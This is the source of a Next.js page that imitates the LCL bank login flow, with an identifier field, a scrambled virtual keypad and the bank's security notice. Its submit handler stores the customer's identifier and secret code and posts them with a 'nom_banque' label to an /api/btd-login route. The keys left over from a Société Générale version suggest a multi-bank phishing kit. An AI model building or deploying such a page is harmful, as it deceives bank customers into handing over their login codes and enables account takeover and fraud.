'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface LCLConnexionProps {
  partnerLogoSrc?: string;
  lclLogoSrc?: string;
}

export default function LCLConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  lclLogoSrc = '/LCL_banque_logo.svg.webp',
}: LCLConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(true);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Passage à l'étape du code secret
  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  // Clavier virtuel
  const handleKeyPress = (digit: string) => {
    setSecretCode((prev) => prev + digit);
  };

  const handleBackspace = () => {
    if (secretCode.length > 0) {
      setSecretCode((prev) => prev.slice(0, -1));
    }
  };

  // Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'LCL',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Disposition des touches du clavier virtuel LCL (4 colonnes)
  const keyboardKeys = ['9', '7', '5', '1', '8', '0', '6', '3', '4', '2'];

  return (
    <>
      <style>{`
        .lcl-body-wrapper {
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
          background-color: #f3f4f6;
          color: #1c2442;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .lcl-app-container {
          max-width: 450px;
          width: 100%;
          min-height: 100vh;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          box-shadow: 0 4px 20px rgba(0,0,0,0.05);
          position: relative;
        }
        .lcl-top-navbar {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 16px 20px;
          background-color: #ffffff;
          border-bottom: 1px solid #f1f5f9;
        }
        .lcl-nav-link {
          color: #00287a;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          display: flex;
          align-items: center;
          gap: 5px;
          cursor: pointer;
        }
        .lcl-logo-block {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .lcl-partner-logo {
          height: 24px;
          width: 24px;
          object-fit: contain;
        }
        .lcl-header-arrow {
          color: #94a3b8;
          font-size: 14px;
          font-weight: 600;
        }
        .lcl-main-logo {
          height: 24px;
          width: auto;
          object-fit: contain;
        }
        .lcl-back-to-id-zone {
          padding: 14px 24px 0 24px;
        }
        .lcl-back-link {
          color: #00287a;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          display: inline-flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
        }
        .lcl-main-content {
          padding: 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .lcl-block-title {
          font-size: 18px;
          color: #00287a;
          font-weight: 700;
          text-align: center;
          margin-bottom: 25px;
        }
        .lcl-form-group {
          width: 100%;
          margin-bottom: 20px;
          position: relative;
        }
        .lcl-input-wrapper {
          position: relative;
          width: 100%;
        }
        .lcl-free-input {
          width: 100%;
          height: 52px;
          padding: 0 42px 0 16px;
          border: 1px solid #b4c6e7;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          color: #00287a;
          outline: none;
          background-color: #ffffff;
          font-weight: 600;
          transition: all 0.2s ease;
        }
        .lcl-free-input:focus {
          border-color: #00287a;
          box-shadow: 0 0 0 1px #00287a;
        }
        .lcl-clear-input {
          position: absolute;
          right: 14px;
          top: 50%;
          transform: translateY(-50%);
          font-size: 22px;
          color: #94a3b8;
          cursor: pointer;
          user-select: none;
        }
        .lcl-remember-box {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          margin-bottom: 30px;
        }
        .lcl-round-check {
          width: 18px;
          height: 18px;
          accent-color: #00287a;
          cursor: pointer;
        }
        .lcl-remember-box label {
          font-size: 14px;
          color: #555555;
          cursor: pointer;
          user-select: none;
        }
        .lcl-btn-pill-blue {
          width: 100%;
          padding: 15px;
          background-color: #00287a;
          color: #ffffff;
          border: none;
          border-radius: 50px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 8px;
          transition: background 0.2s;
        }
        .lcl-btn-pill-blue:hover {
          background-color: #001c54;
        }
        .lcl-btn-pill-gray {
          width: 100%;
          padding: 15px;
          background-color: #e2e8f0;
          color: #94a3b8;
          border: none;
          border-radius: 50px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: not-allowed;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 8px;
        }
        .lcl-lost-links {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 12px;
          margin: 25px 0;
        }
        .lcl-lost-links a {
          color: #00287a;
          font-size: 14px;
          font-weight: 600;
          text-decoration: underline;
        }
        .lcl-security-card {
          border: 1px solid #e2e8f0;
          border-left: 4px solid #00287a;
          border-radius: 8px;
          padding: 16px;
          background-color: #f8fafc;
          margin-top: auto;
        }
        .lcl-security-title-row {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 6px;
          color: #00287a;
        }
        .lcl-security-title-row h3 {
          font-size: 14px;
          font-weight: 700;
        }
        .lcl-security-card p {
          font-size: 13px;
          color: #555555;
          line-height: 1.4;
        }
        .lcl-pass-header-zone {
          text-align: center;
          margin-bottom: 20px;
        }
        .lcl-id-summary {
          font-size: 14px;
          color: #555555;
          margin-top: -15px;
          margin-bottom: 20px;
        }
        .lcl-id-summary strong {
          color: #00287a;
          font-weight: 700;
        }
        .lcl-dots-indicator-row {
          display: flex;
          justify-content: center;
          gap: 12px;
          margin-bottom: 25px;
        }
        .lcl-indicator-dot {
          width: 14px;
          height: 14px;
          border: 1px solid #00287a;
          border-radius: 50%;
          background-color: transparent;
          transition: background-color 0.15s;
        }
        .lcl-dot-filled {
          background-color: #00287a;
        }
        .lcl-grid-keyboard-4col {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 16px;
          max-width: 320px;
          margin: 0 auto 30px auto;
          justify-items: center;
        }
        .lcl-circle-key {
          width: 58px;
          height: 58px;
          border-radius: 50%;
          border: none;
          background-color: #f0f4fa;
          color: #00287a;
          font-size: 18px;
          font-weight: 700;
          font-family: inherit;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: background 0.1s;
        }
        .lcl-circle-key:active {
          background-color: #d1e0f7;
        }
        .lcl-key-clear {
          background-color: #fff0f0;
          color: #ef4444;
        }
        .lcl-key-clear svg {
          width: 20px;
          height: 20px;
          fill: #ef4444;
        }
      `}</style>

      <div className="lcl-body-wrapper">
        <div className="lcl-app-container">
          {/* Header de navigation et logos */}
          <header className="lcl-top-navbar">
            <span className="lcl-nav-link">✕ Quitter</span>
            <div className="lcl-logo-block">
              <img src={partnerLogoSrc} alt="Favicon" className="lcl-partner-logo" />
              <span className="lcl-header-arrow">→</span>
              <img src={lclLogoSrc} alt="LCL Logo" className="lcl-main-logo" />
            </div>
            <span className="lcl-nav-link">? Aide</span>
          </header>

          {/* Bouton retour vers l'étape identifiant */}
          {step === 2 && (
            <div className="lcl-back-to-id-zone">
              <span
                className="lcl-back-link"
                onClick={() => {
                  setSecretCode('');
                  setStep(1);
                }}
              >
                ‹ Retour à l'identifiant
              </span>
            </div>
          )}

          <main className="lcl-main-content">
            {/* ÉTAPE 1 : IDENTIFIANT */}
            {step === 1 && (
              <div style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                <h2 className="lcl-block-title">Saisissez votre identifiant</h2>

                <div className="lcl-form-group">
                  <div className="lcl-input-wrapper">
                    <input
                      type="text"
                      className="lcl-free-input"
                      placeholder="Identifiant"
                      value={clientId}
                      onChange={(e) => setClientId(e.target.value)}
                      autoComplete="off"
                    />
                    {clientId.length > 0 && (
                      <span className="lcl-clear-input" onClick={() => setClientId('')}>
                        ×
                      </span>
                    )}
                  </div>
                </div>

                <div className="lcl-remember-box">
                  <input
                    type="checkbox"
                    id="lcl-remember"
                    className="lcl-round-check"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="lcl-remember">Mémoriser mon identifiant</label>
                </div>

                <button
                  type="button"
                  onClick={handleNextStep}
                  disabled={!clientId.trim()}
                  className={clientId.trim() ? 'lcl-btn-pill-blue' : 'lcl-btn-pill-gray'}
                >
                  Suivant ➔
                </button>

                <div className="lcl-lost-links">
                  <a href="#">Identifiant oublié ?</a>
                  <a href="#">Code personnel oublié ?</a>
                </div>

                <div className="lcl-security-card">
                  <div className="lcl-security-title-row">
                    <span style={{ fontSize: '16px' }}>🛡️</span>
                    <h3>Nos conseils sécurité</h3>
                  </div>
                  <p>
                    Ne communiquez jamais vos codes secrets. LCL ne vous les demandera jamais par e-mail ou SMS.
                  </p>
                </div>
              </div>
            )}

            {/* ÉTAPE 2 : CODE PERSONNEL */}
            {step === 2 && (
              <div style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                <div className="lcl-pass-header-zone">
                  <h2 className="lcl-block-title">Votre code personnel</h2>
                  <p className="lcl-id-summary">
                    Identifiant : <strong>{clientId}</strong>
                  </p>
                </div>

                <div className="lcl-form-group">
                  <div className="lcl-input-wrapper">
                    <input
                      type="password"
                      className="lcl-free-input"
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                      placeholder="Saisissez votre code personnel"
                    />
                    {secretCode.length > 0 && (
                      <span className="lcl-clear-input" onClick={() => setSecretCode('')}>
                        ×
                      </span>
                    )}
                  </div>
                </div>

                {/* Indicateurs visuels */}
                <div className="lcl-dots-indicator-row">
                  {[...Array(6)].map((_, idx) => (
                    <span
                      key={idx}
                      className={`lcl-indicator-dot ${idx < secretCode.length ? 'lcl-dot-filled' : ''}`}
                    />
                  ))}
                </div>

                {/* Clavier virtuel LCL à 4 colonnes */}
                <div className="lcl-grid-keyboard-4col">
                  {keyboardKeys.map((digit) => (
                    <button
                      key={digit}
                      type="button"
                      className="lcl-circle-key"
                      onClick={() => handleKeyPress(digit)}
                    >
                      {digit}
                    </button>
                  ))}
                  <button
                    type="button"
                    className="lcl-circle-key lcl-key-clear"
                    onClick={handleBackspace}
                  >
                    <svg viewBox="0 0 24 24">
                      <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
                    </svg>
                  </button>
                </div>

                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!secretCode.trim() || isSubmitting}
                  className={secretCode.trim() && !isSubmitting ? 'lcl-btn-pill-blue' : 'lcl-btn-pill-gray'}
                >
                  {isSubmitting ? 'Validation en cours...' : 'Valider ➔'}
                </button>
              </div>
            )}
          </main>
        </div>
      </div>
    </>
  );
}